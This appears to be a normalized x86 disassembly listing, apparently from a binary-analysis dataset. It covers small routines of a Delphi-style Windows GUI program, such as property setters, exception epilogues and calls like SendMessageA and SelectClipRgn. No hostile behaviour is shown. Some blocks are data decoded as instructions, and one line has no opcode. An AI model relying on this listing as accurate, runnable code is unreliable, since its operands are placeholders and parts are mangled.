sub_468551
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46880e
jmp sub_403a98
sub_468815
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_468c28
jmp sub_403a98
sub_468c2f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_468cbd
jmp sub_403a98
sub_468cc4
pop ebp
retn
sub_468cc8
sub [ rw-data ] 0x1
retn
sub_46a3d4
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_46a73f
jmp sub_403a98
sub_46a746
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a860
push ebx
mov ebx edx
mov edx ebx
call sub_43aca8
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_46a870
mov [ eax + 0x240 ] edx
retn
sub_46a878
retn
sub_46a904
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_403540
pop esi
retn
sub_46a94c
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403540
pop esi
retn
sub_46ae24
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_403540
pop edx
pop esi
retn
sub_46aeb8
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ebx
retn
sub_46b0cc
xor ecx ecx
call sub_46afc4
retn
sub_46b0d4
mov cl 0x1
call sub_46afc4
retn
sub_46b188
jmp sub_403a98
sub_46b18f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b448
jmp sub_403a98
sub_46b44f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46b5f4
push ebx
mov ebx eax
mov eax ebx
call sub_4476c0
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46b720
sub_46b634
mov al 0x1
retn
sub_46b638
mov al 0x1
retn
sub_46b63c
mov al [ eax + 0x219 ]
retn
sub_46b6f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_404094
pop ebp
retn 0x4
sub_46b700
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_404094
pop ebp
retn 0x4
sub_46b710
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46b718
xor eax eax
retn
sub_46b71c
xor eax eax
retn
sub_46b720
mov [ eax + 0x28d ] 0x0
call sub_46fdc4
retn
sub_46b730
mov [ eax + 0x28d ] 0x1
call sub_46fea0
retn
sub_46b778
mov [ eax + 0x280 ] 0xffffffff
mov [ eax + 0x284 ] 0xffffffff
call sub_46fea0
retn
sub_46ba94
retn
sub_46bb1c
retn
sub_46bb20
mov al 0x1
retn
sub_46bb24
retn
sub_46bbc0
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
sub_46d0ee
jmp sub_4037e4
sub_46d309
jmp sub_403a98
sub_46d310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d32d
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_46d326
jmp sub_403a98
sub_46d32d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d498
jmp sub_403a98
sub_46d49f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4bc
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_46d4b5
jmp sub_403a98
sub_46d4bc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d79c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_46dfb1
jmp sub_403a98
sub_46dfb8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46e018
push ebp
mov ebp esp
call sub_46d79c
pop ebp
retn 0x4
sub_46e024
push ebp
mov ebp esp
call sub_46d79c
pop ebp
retn 0x4
sub_46e8ba
jmp sub_403a98
sub_46e8f4
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a800
retn
sub_46f283
jmp sub_4037e4
sub_46f288
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_46d334
sub_46f6eb
jmp sub_403a98
sub_46f6f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46f874
mov ecx [ eax + 0x220 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x230 ]
retn
cmp edx [ eax + 0x21c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_46f894
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_46f8b4
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_46a36c
pop esi
pop ebx
retn
sub_46f8d0
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_46f8e4
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46c800
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_46f904
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46c800
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_46f924
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_446324
sub_46fa32
jmp sub_403a98
sub_46fa39
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fab8
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_46d79c
sub_46fb54
jmp sub_403a98
sub_46fb5b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fbec
jmp sub_403a98
sub_46fbf3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fc24
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_46d79c
sub_46fcb0
cmp edx [ eax + 0x22c ]
je r-xdata
retn
push 0x1
mov ecx edx
mov edx [ eax + 0x228 ]
call sub_46d4c4
sub_46fda2
jmp sub_403a98
sub_46fda9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fdb0
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_446324
sub_46fe23
jmp sub_403a98
sub_46ffe6
jmp sub_403a98
sub_46ffed
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470050
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_4700cc
push ebx
mov ebx eax
mov eax ebx
call sub_443c20
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_47025c
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_46dbc8
retn
sub_470274
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_46dbc8
retn
sub_470311
jmp sub_403a98
sub_470318
mov esp ebp
pop ebp
retn
sub_47031c
push ebx
mov ebx eax
mov eax ebx
call sub_444044
mov eax ebx
call sub_470288
pop ebx
retn
sub_470380
push ebx
mov ebx eax
mov eax ebx
call sub_44839c
mov eax ebx
call sub_446324
pop ebx
retn
sub_4705f8
push ebx
mov ebx eax
mov eax ebx
call sub_46e7ac
mov eax ebx
call sub_46fea0
pop ebx
retn
sub_47060c
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_46b9c0
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_46f938
pop ebx
retn
sub_470630
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_46ba98
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_46fcc8
pop ebx
retn
sub_470724
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_470730
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47073c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_470748
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_470754
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_470760
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47076c
push ebx
mov ebx eax
mov eax ebx
call sub_448248
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46e7ac
sub_470788
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_470828
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_470944
push ebx
mov ebx eax
mov eax ebx
call sub_46bb80
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4709b4
mov edx [ r-xdata ]
call sub_404e50
retn
sub_470f80
retn
sub_470fdf
jmp sub_403a98
sub_470fe6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471084
jmp sub_403a98
sub_47108b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471150
jmp sub_403a98
sub_471157
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47124f
jmp sub_403a98
sub_471256
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
xor eax eax
pop ebp
retn
sub_4712d4
push ebx
push eax
push sub_4711e4
push eax
push sub_471298
mov cl 0x1
mov eax edx
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
retn
sub_471334
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
retn
sub_471404
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_471448
mov eax [ eax + 0x10 ]
call sub_470f3c
retn
sub_471480
mov eax edx
call sub_4709b4
xor eax eax
retn
sub_47148c
push ebx
mov ebx eax
mov edx sub_471480
mov eax [ ebx + 0x10 ]
call sub_470f78
mov eax [ ebx + 0x10 ]
call sub_470ed0
mov eax ebx
call sub_471404
pop ebx
retn
sub_4715b9
jmp sub_403a98
sub_4715e0
jmp sub_403a98
sub_4715e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4716ba
jmp sub_403a98
sub_4716c1
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4717b6
jmp sub_403a98
sub_4717bd
pop ecx
pop ebp
retn
sub_471897
jmp sub_403a98
sub_47189e
pop ebx
pop ecx
pop ebp
retn
sub_471904
mov eax [ eax + 0x10 ]
call sub_471ca8
retn
sub_471b38
jmp sub_403a98
sub_471b67
jmp sub_403a98
sub_471b6e
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_471c04
jmp sub_403a98
sub_471c0b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_471c14
inc [ eax + 0x2e8 ]
retn
sub_471c1c
dec [ eax + 0x2e8 ]
retn
sub_471ca8
push ebx
mov ebx eax
mov [ ebx + 0x2e4 ] dl
test dl dl
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
mov eax ebx
call sub_46d79c
mov [ ebx + 0x2e5 ] 0x0
sub_471f09
jmp sub_403a98
sub_471f10
pop ebp
retn
sub_471f14
sub [ rw-data ] 0x1
retn
sub_4729f8
push ebx
mov ebx [ eax + 0x8 ]
sub ebx [ eax ]
mov [ edx ] ebx
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ ecx ] edx
pop ebx
retn
sub_472ab0
push esi
cmp dl [ eax + 0x21 ]
je r-xdata
pop esi
retn
mov [ eax + 0x21 ] dl
mov si 0xfffd
call sub_403540
sub_472ac4
push esi
cmp dl [ eax + 0x20 ]
je r-xdata
pop esi
retn
mov [ eax + 0x20 ] dl
mov si 0xfffd
call sub_403540
sub_472ccc
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_472cd8
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
call sub_472ccc
sub_472ce4
cmp cl [ edx ]
je r-xdata
retn
mov [ edx ] cl
call sub_472ccc
sub_472cf0
lea ecx [ eax + 0x4 ]
xchg edx ecx
call sub_472cd8
retn
sub_472cfc
lea ecx [ eax + 0x10 ]
xchg edx ecx
call sub_472cd8
retn
sub_472d08
lea ecx [ eax + 0x14 ]
xchg edx ecx
call sub_472cd8
retn
sub_472d14
lea ecx [ eax + 0x18 ]
xchg edx ecx
call sub_472cd8
retn
sub_472d68
lea ecx [ eax + 0xc ]
xchg edx ecx
call sub_472ce4
retn
sub_472d9c
lea ecx [ eax + 0x24 ]
xchg edx ecx
call sub_472ce4
retn
sub_473030
cmp [ eax + 0x94 ] 0x0
je r-xdata
retn
add eax 0x94
call sub_40d6a0
sub_473070
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call GetBkMode
pop ebx
retn
sub_4730c0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call GetBkColor
pop ebx
retn
sub_47318c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call SetTextAlign
pop esi
pop ebx
retn
sub_4735c8
mov eax [ eax + 0x4 ]
call sub_41e234
retn
sub_473644
push ebp
mov ebp esp
pop ebp
retn 0x10
sub_473910
mov eax [ eax + 0x4 ]
call sub_4738ac
retn
sub_473ad8
push ebx
mov ebx eax
push 0x0
mov eax ebx
call sub_41e234
push eax
call SelectClipRgn
pop ebx
retn
sub_473aec
mov eax [ eax + 0x4 ]
call sub_473ad8
retn
sub_474594
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_474ac8
mov dl [ eax + 0x91 ]
mov [ eax + 0x90 ] dl
mov [ eax + 0x91 ] 0x0
retn
sub_474adc
mov dl [ eax + 0x90 ]
mov [ eax + 0x91 ] dl
retn
sub_474aec
mov [ eax + 0x9a ] 0x1
retn
sub_474cd8
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_476278
xor eax eax
retn
sub_47627c
xor eax eax
retn
sub_476280
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call GetTextAlign
pop ebx
retn
sub_476294
mov al [ eax + 0x98 ]
retn
sub_47629c
push ebx
mov ebx eax
mov [ ebx + 0x98 ] dl
cmp [ ebx + 0x98 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax ebx
call sub_473030
mov [ ebx + 0x9a ] 0x1
sub_4762c8
mov al [ eax + 0x99 ]
retn
sub_47698c
push ebx
mov ecx [ eax ]
mov ebx [ edx ]
mov [ eax ] ebx
mov [ edx ] ecx
pop ebx
retn
sub_4769bd
jmp sub_403a98
sub_4769c4
pop ebp
retn
sub_4769c8
sub [ rw-data ] 0x1
retn
sub_476b0d
jmp sub_403a98
sub_476b14
pop ebp
retn
sub_476b18
sub [ rw-data ] 0x1
retn
sub_477357
jmp sub_403a98
sub_47735e
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
sub_477448
jmp sub_403a98
sub_47744f
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4774d6
jmp sub_403a98
sub_4774dd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4774ec
and eax 0x8000000f
jns r-xdata
inc eax
mov eax [ eax * 4 + rw-data ]
retn
dec eax
or eax 0xfffffff0
inc eax
sub_47756f
jmp sub_403a98
sub_477576
pop ebx
mov esp ebp
pop ebp
retn
sub_477758
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_477764
push ebx
mov ebx eax
mov eax ebx
call sub_42ed38
mov eax [ ebx + 0x288 ]
xor edx edx
mov [ eax + 0x18 ] edx
pop ebx
retn
sub_47777c
push esi
mov esi eax
mov eax [ esi + 0x27c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47778c
lea ecx [ eax + 0x278 ]
xchg edx ecx
call sub_477b20
retn
sub_4779a0
push esi
mov eax [ eax + 0x288 ]
mov esi [ eax + 0x8 ]
mov eax [ esi + 0x1c ]
mov [ edx + 0x1c ] eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_477a9d
jmp sub_403a98
sub_477aa4
mov esp ebp
pop ebp
retn
sub_477aa8
push esi
mov esi eax
cmp ecx [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477b0c
push esi
mov esi eax
cmp ecx [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477b20
push esi
mov esi eax
cmp cl [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] cl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477b48
push ebx
mov ebx eax
mov eax ebx
call sub_444658
mov ax [ ebx + 0x78 ]
mov [ ebx + 0x268 ] ax
pop ebx
retn
sub_477b8c
push esi
mov esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
or [ esi + 0xc ] 0x1
pop esi
retn
sub_477b9c
push ebx
mov ebx edx
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
pop ebx
retn
mov edx ebx
call sub_4471d8
sub_477d10
jmp sub_403a98
sub_477d17
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477d7c
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_477d88
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
retn
sub_477ea8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
pop esi
pop ebx
retn
sub_477ebc
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
sub_477ec8
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
retn
sub_4780b8
lea ecx [ eax + 0x2b4 ]
xchg edx ecx
call sub_477b20
retn
sub_4780c8
lea ecx [ eax + 0x2b0 ]
xchg edx ecx
call sub_477b34
retn
sub_4780d8
push esi
mov esi eax
mov eax [ esi + 0x2b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4780e8
push esi
mov esi eax
cmp dl [ esi + 0x2bc ]
je r-xdata
pop esi
retn
mov [ esi + 0x2bc ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_478200
mov eax [ eax + 0x2c0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47857c
mov ecx [ eax + 0x2b8 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
xor ecx ecx
call sub_4783f8
sub_4787d4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_4773b4
xor al 0x1
pop ebx
retn
sub_478848
push esi
mov esi eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_478858
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_4789a6
jmp sub_403a98
sub_4789ad
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_478d7c
jmp sub_403a98
sub_478d83
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403910
jmp sub_403910
sub_478e72
jmp sub_403a98
sub_478e79
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478e84
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov edx esp
mov eax sub_478d8c
call sub_405610
pop ecx
pop edx
retn
sub_478eef
jmp sub_403a98
sub_478ef6
pop ebp
retn
sub_478ef8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
mov eax [ rw-data ]
push eax
call LoadCursorA
mov ecx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0x7e4
call sub_4611f4
sub_479055
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
hlt
sub_47b149
jmp sub_403a98
sub_47b150
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b158
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_477abc
retn
sub_47b3f8
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b404
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b410
mov eax [ eax + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b41c
mov eax [ eax + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b428
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b434
lea ecx [ eax + 0x40 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47b448
mov eax [ eax + 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b4bc
mov edx eax
fld [ edx + 0xa0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_47b4d8
mov edx eax
fld [ edx + 0xa0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_47b4ed
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x5f7d2230 ] cl
add [ eax ] al
add al bl
sbb eax r-xdata
fnstsw ax
sahf
setne al
retn
sub_47b764
lea ecx [ eax + 0x64 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477abc
retn
sub_47b778
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b784
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x98 ]
mov eax [ eax + 0x90 ]
call sub_477ae4
pop ebp
retn 0x8
sub_47b7a4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0xa0 ]
mov eax [ eax + 0x90 ]
call sub_477ae4
pop ebp
retn 0x8
sub_47b7c4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0xa8 ]
mov eax [ eax + 0x90 ]
call sub_477ae4
pop ebp
retn 0x8
sub_47b7e4
lea ecx [ eax + 0x69 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47b7f8
lea ecx [ eax + 0x6a ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47b80c
lea ecx [ eax + 0x8c ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47bae8
jmp sub_403a98
sub_47baef
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47bb77
jmp sub_403a98
sub_47bb7e
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47bb88
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov al 0x1
retn
sub_47bb9c
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov al 0x1
retn
sub_47c124
jmp sub_403a98
sub_47c12b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47c3ff
jmp sub_403a98
sub_47c406
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c46c
lea ecx [ eax + 0x41 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47c480
push esi
mov esi eax
mov eax [ esi + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47c490
push ebx
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_4773b4
xor al 0x1
pop ebx
retn
sub_47c575
jmp sub_403a98
sub_47c57c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47c584
lea ecx [ eax + 0x60 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477abc
retn
sub_47c598
lea ecx [ eax + 0x8d ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47c60c
jmp sub_403a98
sub_47c613
pop ecx
pop ebp
retn
sub_47c6dc
jmp sub_403a98
sub_47c6e3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c746
jmp sub_403a98
sub_47c74d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c7b2
jmp sub_403a98
sub_47c7b9
pop ecx
pop ebp
retn
sub_47c7bc
lea ecx [ eax + 0x54 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47c7d0
lea ecx [ eax + 0x34 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47c7e4
lea ecx [ eax + 0x4c ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47c7f8
lea ecx [ eax + 0x68 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47c80c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
mov eax [ eax + 0x90 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_47c824
lea ecx [ eax + 0x94 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b20
retn
sub_47c8c7
jmp sub_403a98
sub_47c8ce
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47c94c
jmp sub_403a98
sub_47c953
pop ecx
pop ebp
retn 0x8
sub_47c958
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x18 ]
mov eax [ eax + 0x90 ]
call sub_477ae4
pop ebp
retn 0x8
sub_47c9e4
jmp sub_403a98
sub_47c9eb
pop ecx
pop ebp
retn 0x8
sub_47ca70
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x10 ]
mov eax [ eax + 0x90 ]
call sub_477ae4
pop ebp
retn 0x8
sub_47ca8c
lea ecx [ eax + 0x88 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47caa0
lea ecx [ eax + 0x74 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47cab4
lea ecx [ eax + 0x70 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47cac8
lea ecx [ eax + 0x84 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
retn
sub_47cee2
jmp sub_403a98
sub_47cee9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47d370
mov edx [ eax + 0xd8 ]
sub edx [ eax + 0xd4 ]
mov [ eax + 0xdc ] edx
mov edx [ eax + 0xd4 ]
add edx [ eax + 0xd8 ]
sar edx 0x1
jns r-xdata
mov [ eax + 0xcc ] edx
retn
adc edx 0x0
sub_47dfbc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0xc ]
